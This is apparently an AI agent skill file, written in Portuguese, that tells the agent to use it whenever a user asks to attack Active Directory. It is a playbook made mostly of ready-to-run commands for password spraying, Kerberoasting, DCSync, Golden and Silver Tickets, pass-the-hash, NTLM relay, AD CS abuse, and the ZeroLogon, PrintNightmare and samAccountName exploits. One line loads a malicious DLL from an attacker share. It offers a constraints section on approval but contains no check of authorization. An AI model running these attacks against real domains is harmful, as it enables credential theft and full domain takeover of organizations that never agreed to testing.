---
name: Active Directory Attacks
description: Esta habilidade deve ser usada quando o usuário pedir para "atacar Active Directory", "explorar AD", "Kerberoasting", "DCSync", "pass-the-hash", "enumeração BloodHound", "Golden Ticket", "Silver Ticket", "AS-REP roasting", "NTLM relay", ou precisar de orientação sobre testes de penetração em domínios Windows.
metadata:
  author: zebbern
  version: "1.1"
---

# Ataques ao Active Directory

## Propósito

Fornecer técnicas abrangentes para atacar ambientes Microsoft Active Directory. Cobre reconhecimento, colheita de credenciais, ataques Kerberos, movimento lateral, escalação de privilégio e dominância de domínio para operações de equipes vermelhas e testes de penetração.

## Entradas/Pré-requisitos

- Kali Linux ou plataforma de ataque Windows
- Credenciais de usuário do domínio (para a maioria dos ataques)
- Acesso de rede ao Domain Controller
- Ferramentas: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec

## Saídas/Entregáveis

- Dados de enumeração de domínio
- Credenciais e hashes extraídos
- Tickets Kerberos para representação
- Acesso de Domain Administrator
- Mecanismos de acesso persistente

---

## Ferramentas Essenciais

| Ferramenta | Propósito |
|------|---------|
| BloodHound | Visualização de caminho de ataque AD |
| Impacket | Ferramentas de ataque AD em Python |
| Mimikatz | Extração de credenciais |
| Rubeus | Ataques Kerberos |
| CrackMapExec | Exploração de rede |
| PowerView | Enumeração AD |
| Responder | Envenenamento LLMNR/NBT-NS |

---

## Fluxo de Trabalho Principal

### Passo 1: Sincronização do Relógio Kerberos

Kerberos requer sincronização de relógio (±5 minutos):

```bash
# Detectar descompasso de relógio
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Corrigir relógio no Linux
sudo date -s "14 APR 2024 18:25:16"

# Corrigir relógio no Windows
net time /domain /set

# Falsificar relógio sem alterar a hora do sistema
faketime -f '+8h' <command>
```

### Passo 2: Reconhecimento de AD com BloodHound

```bash
# Iniciar BloodHound
neo4j console
bloodhound --no-sandbox

# Coletar dados com SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Coletor Python (do Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Passo 3: Enumeração com PowerView

```powershell
# Obter informações de domínio
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# Enumerar usuários
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Enumerar grupos
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Encontrar acesso de admin local
Find-LocalAdminAccess -Verbose

# Caça de usuários
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## Ataques de Credencial

### Pulverização de Senha

```bash
# Usando kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# Usando CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

Extrair tickets TGS de conta de serviço e quebrar offline:

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# Quebrar com hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

Direcionar contas com "Não requer pré-autenticação Kerberos":

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Quebrar com hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### Ataque DCSync

Extrair credenciais diretamente do DC (requer direitos Replicating Directory Changes):

```bash
# Impacket
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Ataques de Ticket Kerberos

### Pass-the-Ticket (Golden Ticket)

Forjar TGT com hash krbtgt para qualquer usuário:

```powershell
# Obter hash krbtgt via DCSync primeiro
# Mimikatz - Criar Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### Silver Ticket

Forjar TGS para serviço específico:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

### OverPass-the-Hash

Converter hash NTLM para ticket Kerberos:

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## Ataques de Relay NTLM

### Responder + ntlmrelayx

```bash
# Iniciar Responder (desabilitar SMB/HTTP para relay)
responder -I eth0 -wrf

# Iniciar relay
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP relay para ataque de delegação
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

### Verificação de Assinatura SMB

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

---

## Ataques de Serviços de Certificado (AD CS)

### ESC1 - Templates Mal Configurados

```bash
# Encontrar templates vulneráveis
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# Explorar ESC1
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local

# Autenticar com certificado
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8 - Web Enrollment Relay

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## CVEs Críticas

### ZeroLogon (CVE-2020-1472)

```bash
# Verificar vulnerabilidade
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon

# Explorar
python3 cve-2020-1472-exploit.py DC01 10.10.10.10

# Extrair hashes
secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass

# Restaurar senha (importante!)
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

### PrintNightmare (CVE-2021-1675)

```bash
# Verificar vulnerabilidade
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'

# Explorar (requer hospedar DLL malicioso)
python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
```

### samAccountName Spoofing (CVE-2021-42278/42287)

```bash
# Exploração automatizada
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

---

## Referência Rápida

| Ataque | Ferramenta | Comando |
|--------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
| Pulverizar | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

---

## Restrições

**Deve:**
- Sincronizar hora com DC antes de ataques Kerberos
- Ter credenciais de domínio válidas para a maioria dos ataques
- Documentar todas as contas comprometidas

**Não Deve:**
- Bloquear contas com pulverização excessiva de senha
- Modificar objetos AD de produção sem aprovação
- Deixar Golden Tickets sem documentação

**Deveria:**
- Executar BloodHound para descoberta de caminho de ataque
- Verificar assinatura SMB antes de ataques de relay
- Verificar níveis de patch para exploração de CVE

---

## Exemplos

### Exemplo 1: Compromisso de Domínio via Kerberoasting

```bash
# 1. Encontrar contas de serviço com SPNs
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10

# 2. Solicitar tickets TGS
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# 3. Quebrar tickets
hashcat -m 13100 tgs.txt rockyou.txt

# 4. Usar conta de serviço quebrada
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```

### Exemplo 2: NTLM Relay para LDAP

```bash
# 1. Iniciar relay direcionando LDAP
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# 2. Disparar autenticação (ex: via PrinterBug)
python3 printerbug.py domain.local/user:pass@target 10.10.10.12

# 3. Usar conta de máquina criada para ataque RBCD
```

---

## Solução de Problemas

| Problema | Solução |
|-------|----------|
| Descompasso de relógio muito grande | Sincronizar hora com DC ou usar faketime |
| Kerberoasting retorna vazio | Nenhuma conta de serviço com SPNs |
| Acesso DCSync negado | Precisa de direitos Replicating Directory Changes |
| NTLM relay falha | Verificar assinatura SMB, tentar alvo LDAP |
| BloodHound vazio | Verificar se coletor executou com credenciais corretas |

---

## Recursos Adicionais

Para técnicas avançadas incluindo ataques de delegação, abuso de GPO, ataques RODC, implantação SCCM/WSUS, exploração ADCS, relações de confiança e integração Linux AD, consulte [references/advanced-attacks.md](references/advanced-attacks.md).